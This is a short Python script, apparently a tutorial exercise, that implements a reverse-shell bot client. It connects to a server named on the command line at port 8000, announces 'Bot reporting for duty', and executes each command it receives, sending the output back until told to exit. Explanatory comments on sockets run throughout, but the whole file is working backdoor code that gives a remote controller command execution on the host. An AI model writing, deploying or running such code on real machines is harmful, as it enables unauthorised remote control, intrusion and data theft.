import sys
from subprocess import Popen,PIPE
from socket import *
from types import resolve_bases

serverName = sys.argv[1]
serverPort = 8000

#Create IPv4(AF-INET), TCPSocket(Socket_Stream)
clientSocket = socket(AF_INET,SOCK_STREAM) # Tells the socket library to create an IPv4 socket and a TCP socket.
clientSocket.connect((serverName,serverPort))
clientSocket.send('Bot reporting for duty'.encode()) # socket library is designed to send binary data, so if you want to send a string you must first encode it with '.encode()'

command = clientSocket.recv(4064).decode() # Specify the maximum number of bytes to read
while command !="exit":
        proc = Popen(command.split(" "),stdout=PIPE,stderr=PIPE) # Popen method creates a copy of the current process(subprocess)
        result,err = proc.communicate() # Read the results which are sent.
        clientSocket.send(result)
        command = (clientSocket.recv(4064)).decode()

clientSocket.close()
